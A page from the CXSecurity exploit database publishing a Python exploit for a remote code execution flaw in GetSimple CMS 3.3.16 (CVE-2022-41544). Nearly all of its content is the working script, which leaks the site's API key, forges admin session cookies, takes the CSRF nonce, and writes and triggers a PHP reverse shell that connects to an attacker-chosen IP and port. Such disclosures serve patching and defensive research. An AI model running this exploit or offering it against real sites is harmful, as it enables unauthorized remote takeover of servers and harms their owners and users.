---
title: GetSimple CMS 3.3.16 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023050077
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-29
fetch_date: 2025-10-04T11:37:06.830997
---

# GetSimple CMS 3.3.16 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **GetSimple CMS 3.3.16 Shell Upload** **2023.05.28**  Credit:  **[Youssef Muhammad](https://cxsecurity.com/author/Youssef%2BMuhammad/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-41544](https://cxsecurity.com/cveshow/CVE-2022-41544/ "Click to see CVE-2022-41544")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: GetSimple CMS v3.3.16 - Remote Code Execution (RCE)
# Data: 18/5/2023
# Exploit Author : Youssef Muhammad
# Vendor: Get-simple
# Software Link:
# Version app: 3.3.16
# Tested on: linux
# CVE: CVE-2022-41544
import sys
import hashlib
import re
import requests
from xml.etree import ElementTree
from threading import Thread
import telnetlib
purple = "\033[0;35m"
reset = "\033[0m"
yellow = "\033[93m"
blue = "\033[34m"
red = "\033[0;31m"
def print\_the\_banner():
print(purple + '''
CCC V V EEEE 22 000 22 22 4 4 11 5555 4 4 4 4
C V V E 2 2 0 00 2 2 2 2 4 4 111 5 4 4 4 4
C V V EEE --- 2 0 0 0 2 2 --- 4444 11 555 4444 4444
C V V E 2 00 0 2 2 4 11 5 4 4
CCC V EEEE 2222 000 2222 2222 4 11l1 555 4 4
'''+ reset)
def get\_version(target, path):
r = requests.get(f"http://{target}{path}admin/index.php")
match = re.search("jquery.getsimple.js\?v=(.\*)\"", r.text)
if match:
version = match.group(1)
if version <= "3.3.16":
print( red + f"[+] the version {version} is vulnrable to CVE-2022-41544")
else:
print ("This is not vulnrable to this CVE")
return version
return None
def api\_leak(target, path):
r = requests.get(f"http://{target}{path}data/other/authorization.xml")
if r.ok:
tree = ElementTree.fromstring(r.content)
apikey = tree[0].text
print(f"[+] apikey obtained {apikey}")
return apikey
return None
def set\_cookies(username, version, apikey):
cookie\_name = hashlib.sha1(f"getsimple\_cookie\_{version.replace('.', '')}{apikey}".encode()).hexdigest()
cookie\_value = hashlib.sha1(f"{username}{apikey}".encode()).hexdigest()
cookies = f"GS\_ADMIN\_USERNAME={username};{cookie\_name}={cookie\_value}"
headers = {
'Content-Type':'application/x-www-form-urlencoded',
'Cookie': cookies
}
return headers
def get\_csrf\_token(target, path, headers):
r = requests.get(f"http://{target}{path}admin/theme-edit.php", headers=headers)
m = re.search('nonce" type="hidden" value="(.\*)"', r.text)
if m:
print("[+] csrf token obtained")
return m.group(1)
return None
def upload\_shell(target, path, headers, nonce, shell\_content):
upload\_url = f"http://{target}{path}admin/theme-edit.php?updated=true"
payload = {
'content': shell\_content,
'edited\_file': '../shell.php',
'nonce': nonce,
'submitsave': 1
}
try:
response = requests.post(upload\_url, headers=headers, data=payload)
if response.status\_code == 200:
print("[+] Shell uploaded successfully!")
else:
print("(-) Shell upload failed!")
except requests.exceptions.RequestException as e:
print("(-) An error occurred while uploading the shell:", e)
def shell\_trigger(target, path):
url = f"http://{target}{path}/shell.php"
try:
response = requests.get(url)
if response.status\_code == 200:
print("[+] Webshell trigged successfully!")
else:
print("(-) Failed to visit the page!")
except requests.exceptions.RequestException as e:
print("(-) An error occurred while visiting the page:", e)
def main():
if len(sys.argv) != 5:
print("Usage: python3 CVE-2022-41544.py <target> <path> <ip:port> <username>")
return
target = sys.argv[1]
path = sys.argv[2]
if not path.endswith('/'):
path += '/'
ip, port = sys.argv[3].split(':')
username = sys.argv[4]
shell\_content = f"""<?php
$ip = '{ip}';
$port = {port};
$sock = fsockopen($ip, $port);
$proc = proc\_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
"""
version = get\_version(target, path)
if not version:
print("(-) could not get version")
return
apikey = api\_leak(target, path)
if not apikey:
print("(-) could not get apikey")
return
headers = set\_cookies(username, version, apikey)
nonce = get\_csrf\_token(target, path, headers)
if not nonce:
print("(-) could not get nonce")
return
upload\_shell(target, path, headers, nonce, shell\_content)
shell\_trigger(target, path)
if \_\_name\_\_ == '\_\_main\_\_':
print\_the\_banner()
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050077)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top